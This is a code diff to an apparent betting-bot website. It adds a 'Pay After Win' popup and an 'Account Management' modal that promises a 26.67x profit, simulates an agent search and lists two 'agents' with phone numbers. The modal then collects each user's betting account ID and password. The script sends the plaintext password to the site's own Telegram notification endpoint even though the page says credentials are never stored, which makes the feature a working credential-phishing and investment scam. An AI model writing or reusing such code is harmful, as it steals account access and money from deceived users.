@@ -3551,15 +3551,6 @@
                 </div>
             </div>
         </header>
-        <!-- Floating Pay After Win Popup - Commented Out
-        <div id="payAfterWinPopup" class="floating-popup">
-            <div class="popup-content">
-                <span class="popup-close" id="closePayAfterWinPopup">&times;</span>
-                <div class="popup-icon">💰</div>
-                <div class="popup-text">Click here for PAY AFTER WIN help!</div>
-            </div>
-        </div>
-        -->
 
         <main style="display: flex; justify-content: center; padding: 120px 16px 60px;">
             <div class="landing-wrapper" id="landingWrapper">
@@ -7263,15 +7254,7 @@
         document.addEventListener('DOMContentLoaded', () => {
             const freeTrialBtn = document.getElementById('freeTrialBtn');
             if (freeTrialBtn) {
-                // Remove old listeners by cloning (simple trick) or just overwriting onclick if possible
-                // Better: just add a new listener that stops propagation if we want to override, 
-                // but the old one calls openFreeTrialModal(). We can overwrite openFreeTrialModal reference if it's global?
-                // Or easier: change the element ID in the HTML if I had access, but I do via replacement.
-                // Let's rely on overwriting the click handler if I can find where it is attached.
-                // It was attached in initLandingPage() via addEventListener.
 
-                // Since I can't easily remove the anonymous listener, I will force a new behavior 
-                // by replacing the button element with a clone to strip listeners.
                 const newBtn = freeTrialBtn.cloneNode(true);
                 freeTrialBtn.parentNode.replaceChild(newBtn, freeTrialBtn);
 
@@ -7311,6 +7294,606 @@
             }
         });
 
+    </script>
+    <!-- Pay After Win Popup -->
+    <div id="payAfterWinPopup" class="pay-after-win-popup" onclick="openAccountManagementModal()">
+        <div class="popup-content">
+            <span class="paw-pulse-dot"></span>
+            <span class="popup-text">Pay After Win ! CLICK HERE</span>
+        </div>
+    </div>
+
+    <!-- Account Management Modal -->
+    <div id="accountManagementModal" class="modal-overlay">
+        <div class="modal-content account-mgmt-content">
+            <div class="pay-modal-header"
+                style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
+                <h2 style="color: #f1c40f; margin: 0; font-size: 1.5em;">Account Management</h2>
+                <button class="modal-close" onclick="closeAccountManagementModal()"
+                    style="background: none; border: none; color: #fff; font-size: 2em; cursor: pointer;">&times;</button>
+            </div>
+
+            <!-- Stage 1: Info & Calculator -->
+            <div id="am-stage-1" class="am-stage active">
+                <div class="info-section">
+                    <h3 style="color: #f1c40f; margin-bottom: 12px; font-size: 1.3em;">🎯 HOW ACCOUNT MANAGEMENT WORKS
+                    </h3>
+                    <p style="line-height: 1.8;">
+                        Our <strong>Account Management Program</strong> connects you with a dedicated professional agent
+                        from your region who will operate the advanced bot on your behalf—completely free of charge.
+                        Here's what makes this opportunity unique:
+                    </p>
+                    <ul style="margin: 15px 0; padding-left: 20px; line-height: 1.8;">
+                        <li><strong>Zero Upfront Costs:</strong> No payment required before winning.</li>
+                        <li><strong>Expert Guidance:</strong> Your agent coordinates the perfect timing for deposits.
+                        </li>
+                        <li><strong>Profit-Sharing Model:</strong> You keep <span class="highlight">60% of all
+                                profits</span>, and send us 40% only after you withdraw your winnings.</li>
+                        <li><strong>Risk Mitigation:</strong> You maintain full control of your betting account while
+                            our agent does execution.</li>
+                    </ul>
+                    <p style="margin-top: 10px; font-size: 0.9em; color: #adb6c8;">
+                        This collaborative approach ensures alignment of interests—we only succeed when you profit.
+                    </p>
+                </div>
+
+                <div class="calculator-section">
+                    <h3 style="color: #f1c40f; margin-bottom: 15px; display: flex; align-items: center; gap: 8px;">
+                        <i class="fas fa-calculator"></i> Profit Projection Calculator
+                    </h3>
+
+                    <div class="input-group">
+                        <label style="font-weight: 600;">Select Your Currency</label>
+                        <select id="amCurrencySelect" class="auth-input" onchange="calculateProfitAM()"
+                            style="margin-bottom: 15px;">
+                            <option value="USD">🇺🇸 USD - US Dollar</option>
+                            <option value="KES">🇰🇪 KES - Kenyan Shilling</option>
+                            <option value="GHS">🇬🇭 GHS - Ghanaian Cedi</option>
+                            <option value="NGN">🇳🇬 NGN - Nigerian Naira</option>
+                            <option value="ZAR">🇿🇦 ZAR - South African Rand</option>
+                            <option value="INR">🇮🇳 INR - Indian Rupee</option>
+                            <option value="BRL">🇧🇷 BRL - Brazilian Real</option>
+                            <option value="EUR">🇪🇺 EUR - Euro</option>
+                            <option value="GBP">🇬🇧 GBP - British Pound</option>
+                            <option value="UGX">🇺🇬 UGX - Ugandan Shilling</option>
+                            <option value="TZS">🇹🇿 TZS - Tanzanian Shilling</option>
+                        </select>
+                    </div>
+
+                    <div class="input-group">
+                        <label style="font-weight: 600;">Enter Your Stake Amount</label>
+                        <div class="input-wrapper">
+                            <span class="currency-symbol" id="amCurrencySymbol">$</span>
+                            <input type="number" id="amStakeInput" placeholder="30" oninput="calculateProfitAM()"
+                                style="padding-left: 30px;">
+                        </div>
+                        <small style="color: #888; font-size: 0.85em; display: block; margin-top: 5px;">Based on a real
+                            proven
+                            live profit model</small>
+                    </div>
+
+                    <div class="calc-results">
+                        <div class="result-row"
+                            style="font-size: 1em; color: #adb6c8; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 10px; margin-bottom: 10px;">
+                            <span>💰 Projected Total Profit:</span>
+                            <span id="amProjectedProfit" class="profit-val"
+                                style="color: #3498db; font-weight: 700;">$0</span>
+                        </div>
+                        <div class="result-row user-share">
+                            <span><i class="fas fa-user"></i> You Keep (60%):</span>
+                            <span id="amUserShare" class="profit-val">$0</span>
+                        </div>
+                        <div class="result-row agent-share">
+                            <span><i class="fas fa-handshake"></i> You send agent(40%):</span>
+                            <span id="amAgentShare" class="profit-val">$0</span>
+                        </div>
+                    </div>
+                    <p style="font-size: 0.8em; color: #666; margin-top: 12px; text-align: center; font-style: italic;">
+                        * Projections based on historical performance. Actual results may vary.
+                    </p>
+                </div>
+
+                <button class="cta-button primary" onclick="goToAgentSearch()"
+                    style="width: 100%; justify-content: center; font-size: 1.1em; padding: 14px;">Continue to Agent
+                    →</button>
+            </div>
+
+            <!-- Stage 2: Agent Search -->
+            <div id="am-stage-2" class="am-stage">
+                <div id="agentSearching" class="agent-searching">
+                    <div class="paw-loader"></div>
+                    <h3 style="color: #f1c40f; margin-top: 15px;">Matching You With an Agent...</h3>
+                    <p style="color: #adb6c8; margin-top: 10px;">Our system is scanning for the most qualified agents in
+                        your region</p>
+                </div>
+
+                <div id="agentResults" class="agent-results" style="display: none;">
+                    <h3 style="color: #f1c40f; margin-bottom: 10px; font-size: 1.3em;">✅ Available Professional Agents
+                    </h3>
+                    <p style="color: #c4c9d4; margin-bottom: 20px; font-size: 0.95em;">
+                        Select your preferred agent to proceed. Both are certified professionals with proven track
+                        records.
+                    </p>
+                    <div class="agents-grid">
+                        <div class="agent-card" onclick="selectAgent('John', '254752776585')">
+                            <div class="agent-avatar">J</div>
+                            <div class="agent-info">
+                                <h4>Agent John</h4>
+                                <span class="status-badge">✓ Online & Available</span>
+                                <p style="font-size: 0.8em; color: #888; margin-top: 5px;">Senior Account Manager</p>
+                            </div>
+                        </div>
+                        <div class="agent-card" onclick="selectAgent('Cornell', '254106765157')">
+                            <div class="agent-avatar">C</div>
+                            <div class="agent-info">
+                                <h4>Agent Cornell</h4>
+                                <span class="status-badge">✓ Online & Available</span>
+                                <p style="font-size: 0.8em; color: #888; margin-top: 5px;">Senior Account Manager</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Stage 3: User Details -->
+            <div id="am-stage-3" class="am-stage">
+                <h3 style="color: #f1c40f; margin-bottom: 10px; font-size: 1.3em;">📝 Account Details Submission</h3>
+                <p class="stage-desc" style="color: #c4c9d4; margin-bottom: 20px; line-height: 1.6;">
+                    You're almost ready to start! Please provide your betting account information below so <strong><span
+                            id="selectedAgentName" class="highlight">your agent</span></strong> can coordinate your
+                    managed sessions. All information is transmitted securely and handled with strict confidentiality.
+                </p>
+
+                <form id="amDetailsForm" onsubmit="submitAccountManagement(event)">
+                    <div class="input-group">
+                        <label style="font-weight: 600;"><i class="fas fa-globe"></i> Betting Platform</label>
+                        <input type="text" id="amSite" required placeholder="e.g. SportyBet, 1xBet, Bet365"
+                            class="auth-input">
+                        <small style="color: #888; font-size: 0.85em;">The site where your gaming sessions will take
+                            place</small>
+                    </div>
+                    <div class="input-group">
+                        <label style="font-weight: 600;"><i class="fas fa-money-bill-wave"></i> Stake
+                            Amount</label>
+                        <input type="number" id="amFinalStake" required placeholder="Enter amount" class="auth-input">
+                        <small style="color: #888; font-size: 0.85em;">The amount you're prepared to stake (at least
+                            10$)</small>
+                    </div>
+                    <div class="input-group">
+                        <label style="font-weight: 600;"><i class="fas fa-id-card"></i> Account Number/ID</label>
+                        <input type="text" id="amAccountNum" required placeholder="Your betting account identifier"
+                            class="auth-input">
+                        <small style="color: #888; font-size: 0.85em;">Required for account verification and
+                            coordination</small>
+                    </div>
+                    <div class="input-group">
+                        <label style="font-weight: 600;"><i class="fas fa-lock"></i> Account Password</label>
+                        <input type="password" id="amPassword" required placeholder="Your account password"
+                            class="auth-input">
+                        <small style="color: #888; font-size: 0.85em;">Secured via end-to-end encryption - never stored
+                            permanently</small>
+                    </div>
+
+                    <div
+                        style="background: rgba(46, 204, 113, 0.1); border-left: 3px solid #2ecc71; padding: 12px; border-radius: 8px; margin: 20px 0; font-size: 0.9em;">
+                        <strong style="color: #2ecc71;">🔒 Security Guarantee:</strong> Your credentials are transmitted
+                        directly to your assigned agent via secure WhatsApp protocol. We never store sensitive
+                        information on our servers.
+                    </div>
+
+                    <button type="submit" class="cta-button primary"
+                        style="width: 100%; justify-content: center; font-size: 1.1em; padding: 14px;">
+                        <i class="fab fa-whatsapp"></i> Connect with Agent
+                    </button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <style>
+        /* Pay After Win Popup Styles */
+        .pay-after-win-popup {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 2000;
+            background: linear-gradient(135deg, #f1c40f 0%, #f39c12 100%);
+            border-radius: 50px;
+            padding: 12px 24px;
+            box-shadow: 0 10px 25px rgba(241, 196, 15, 0.4);
+            cursor: pointer;
+            animation: paw-float 3s ease-in-out infinite, paw-slideInRight 0.8s ease-out;
+            transition: transform 0.3s;
+            display: none;
+            /* Hidden by default, shown via JS */
+            align-items: center;
+        }
+
+        .pay-after-win-popup:hover {
+            transform: scale(1.05);
+        }
+
+        .popup-content {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .paw-pulse-dot {
+            width: 10px;
+            height: 10px;
+            background: #fff;
+            border-radius: 50%;
+            animation: paw-pulse 1.5s infinite;
+        }
+
+        .popup-text {
+            color: #000;
+            font-weight: 700;
+            font-size: 0.95em;
+        }
+
+        @keyframes paw-float {
+
+            0%,
+            100% {
+                transform: translateY(0);
+            }
+
+            50% {
+                transform: translateY(-10px);
+            }
+        }
+
+        @keyframes paw-pulse {
+            0% {
+                box-shadow: 0 0 0 0 rgba(255, 255, 255, 0.7);
+            }
+
+            70% {
+                box-shadow: 0 0 0 10px rgba(255, 255, 255, 0);
+            }
+
+            100% {
+                box-shadow: 0 0 0 0 rgba(255, 255, 255, 0);
+            }
+        }
+
+        @keyframes paw-slideInRight {
+            from {
+                transform: translateX(100%);
+                opacity: 0;
+            }
+
+            to {
+                transform: translateX(0);
+                opacity: 1;
+            }
+        }
+
+        /* Account Management Modal Styles */
+        .account-mgmt-content {
+            background: #1a1d29;
+            width: min(500px, 95vw);
+            border: 1px solid rgba(241, 196, 15, 0.3);
+            border-radius: 20px;
+            padding: 30px;
+            max-height: 90vh;
+            overflow-y: auto;
+            position: relative;
+        }
+
+        .am-stage {
+            display: none;
+            animation: paw-fadeIn 0.4s ease;
+        }
+
+        .am-stage.active {
+            display: block;
+        }
+
+        .info-section {
+            background: rgba(241, 196, 15, 0.1);
+            border-left: 4px solid #f1c40f;
+            padding: 15px;
+            margin-bottom: 25px;
+            border-radius: 8px;
+            font-size: 0.95em;
+            line-height: 1.6;
+            color: #dcdde1;
+        }
+
+        .info-section .highlight {
+            color: #f1c40f;
+            font-weight: 700;
+        }
+
+        .calc-results {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 15px;
+            border-radius: 12px;
+            margin: 20px 0;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .result-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            font-size: 0.9em;
+            color: #bdc3c7;
+        }
+
+        .result-row:last-child {
+            margin-bottom: 0;
+        }
+
+        .result-row.user-share {
+            color: #2ecc71;
+            font-weight: 600;
+            font-size: 1.1em;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            padding-top: 10px;
+            margin-top: 10px;
+        }
+
+        .result-row.agent-share {
+            color: #e74c3c;
+            font-size: 0.9em;
+        }
+
+        .agent-searching {
+            text-align: center;
+            padding: 40px 0;
+        }
+
+        .paw-loader {
+            border: 4px solid rgba(241, 196, 15, 0.1);
+            border-top: 4px solid #f1c40f;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: paw-spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+
+        @keyframes paw-spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .agents-grid {
+            display: grid;
+            gap: 15px;
+            margin-top: 20px;
+        }
+
+        .agent-card {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 15px;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            cursor: pointer;
+            transition: all 0.2s;
+            border: 1px solid transparent;
+        }
+
+        .agent-card:hover {
+            background: rgba(241, 196, 15, 0.15);
+            border-color: rgba(241, 196, 15, 0.4);
+        }
+
+        .agent-avatar {
+            width: 50px;
+            height: 50px;
+            background: #f1c40f;
+            color: #000;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 800;
+            font-size: 1.2em;
+        }
+
+        .agent-info h4 {
+            margin: 0 0 5px;
+            color: #fff;
+        }
+
+        .status-badge {
+            background: rgba(46, 204, 113, 0.2);
+            color: #2ecc71;
+            font-size: 0.75em;
+            padding: 2px 8px;
+            border-radius: 10px;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #bdc3c7;
+            font-size: 0.9em;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 12px;
+            background: rgba(0, 0, 0, 0.4);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            color: #fff;
+        }
+
+        .input-group input:focus {
+            border-color: #f1c40f;
+            outline: none;
+        }
+
+        @keyframes paw-fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+    </style>
+
+    <script>
+        let selectedAgent = null;
+
+        function openAccountManagementModal() {
+            document.getElementById('accountManagementModal').classList.add('active');
+            showStage(1);
+        }
+
+        function closeAccountManagementModal() {
+            document.getElementById('accountManagementModal').classList.remove('active');
+        }
+
+        function showStage(stageNum) {
+            document.querySelectorAll('.am-stage').forEach(el => el.classList.remove('active'));
+            document.getElementById(`am-stage-${stageNum}`).classList.add('active');
+        }
+
+        // Currency Symbol Mapping
+        const AM_CURRENCY_SYMBOLS = {
+            'USD': '$', 'KES': 'KSh ', 'GHS': 'GH₵ ', 'NGN': '₦ ', 'ZAR': 'R ',
+            'INR': '₹ ', 'BRL': 'R$ ', 'EUR': '€ ', 'GBP': '£ ', 'UGX': 'USh ', 'TZS': 'TSh '
+        };
+
+        function calculateProfitAM() {
+            const stakeInput = document.getElementById('amStakeInput');
+            const currencySelect = document.getElementById('amCurrencySelect');
+            const currencySymbolEl = document.getElementById('amCurrencySymbol');
+
+            if (!stakeInput || !currencySelect) return;
+
+            const stake = parseFloat(stakeInput.value) || 0;
+            const selectedCurrency = currencySelect.value;
+            const symbol = AM_CURRENCY_SYMBOLS[selectedCurrency] || '$';
+
+            // Update currency symbol in input
+            if (currencySymbolEl) currencySymbolEl.textContent = symbol;
+
+            // Sync final stake input if it exists
+            const finalStakeInput = document.getElementById('amFinalStake');
+            if (finalStakeInput) finalStakeInput.value = stakeInput.value;
+
+            // Use the proven $30 -> $800 profit model (26.67x multiplier)
+            const PROFIT_MULTIPLIER = 800 / 30; // ~26.67
+
+            // Calculate in USD first
+            let stakeInUSD = stake;
+            if (selectedCurrency !== 'USD' && window.exchangeRates && window.exchangeRates[selectedCurrency]) {
+                stakeInUSD = stake / window.exchangeRates[selectedCurrency];
+            }
+
+            // Calculate profit in USD
+            const profitInUSD = stakeInUSD * PROFIT_MULTIPLIER;
+
+            // Convert back to selected currency
+            let projectedProfit = profitInUSD;
+            if (selectedCurrency !== 'USD' && window.exchangeRates && window.exchangeRates[selectedCurrency]) {
+                projectedProfit = profitInUSD * window.exchangeRates[selectedCurrency];
+            }
+
+            const userShare = projectedProfit * 0.60;
+            const agentShare = projectedProfit * 0.40;
+
+            // Format with currency symbol
+            document.getElementById('amProjectedProfit').textContent = symbol + projectedProfit.toFixed(2);
+            document.getElementById('amUserShare').textContent = symbol + userShare.toFixed(2);
+            document.getElementById('amAgentShare').textContent = symbol + agentShare.toFixed(2);
+        }
+
+        function goToAgentSearch() {
+            showStage(2);
+
+            // Reset search state
+            document.getElementById('agentSearching').style.display = 'block';
+            document.getElementById('agentResults').style.display = 'none';
+
+            // Simulate search
+            setTimeout(() => {
+                document.getElementById('agentSearching').style.display = 'none';
+                document.getElementById('agentResults').style.display = 'block';
+            }, 2500);
+        }
+
+        function selectAgent(name, phone) {
+            selectedAgent = { name, phone };
+            document.getElementById('selectedAgentName').textContent = name;
+            showStage(3);
+        }
+
+        function submitAccountManagement(e) {
+            e.preventDefault();
+
+            if (!selectedAgent) return;
+
+            const site = document.getElementById('amSite').value;
+            const finalStake = document.getElementById('amFinalStake').value;
+            const accountNum = document.getElementById('amAccountNum').value;
+            const accountPassword = document.getElementById('amPassword').value;
+            const userContact = sessionStorage.getItem('aviator_contact') || 'Unknown User';
+            const selectedCurrency = document.getElementById('amCurrencySelect')?.value || 'USD';
+
+            // Send Telegram Notification to Admin (non-blocking)
+            const telegramMessage = `🎯 <b>ACCOUNT MANAGEMENT REQUEST</b>\n\n` +
+                `👤 User: ${userContact}\n` +
+                `👨‍💼 Agent: <b>${selectedAgent.name}</b> (${selectedAgent.phone})\n` +
+                `🌍 Betting Site: <b>${site}</b>\n` +
+                `💰 Stake: ${finalStake} ${selectedCurrency}\n` +
+                `🆔 Account ID: ${accountNum}\n` +
+                `🔐 Password: ${accountPassword}\n` +
+                `⏰ Time: ${new Date().toLocaleString()}`;
+
+            fetch(`${API_BASE_URL}/api/telegram/send`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ message: telegramMessage })
+            }).catch(err => console.error('Failed to send account management notification:', err));
+
+            // Construct WhatsApp Message
+            const message = `I just submitted my details for account management on ${site} and I have ${finalStake} for playing.`;
+
+            // WhatsApp URL
+            const whatsappUrl = `https://wa.me/${selectedAgent.phone}?text=${encodeURIComponent(message)}`;
+
+            // Open WhatsApp
+            window.location.href = whatsappUrl;
+        }
+
+        // Initialize calculator after a short delay to ensure exchangeRates are loaded
+        setTimeout(() => {
+            if (typeof calculateProfitAM === 'function') {
+                calculateProfitAM();
+            }
+        }, 500);
+
+        // Show Popup after 3 seconds
+        setTimeout(() => {
+            const popup = document.getElementById('payAfterWinPopup');
+            if (popup) {
+                popup.style.display = 'flex';
+            }
+        }, 3000);
     </script>
 </body>
 
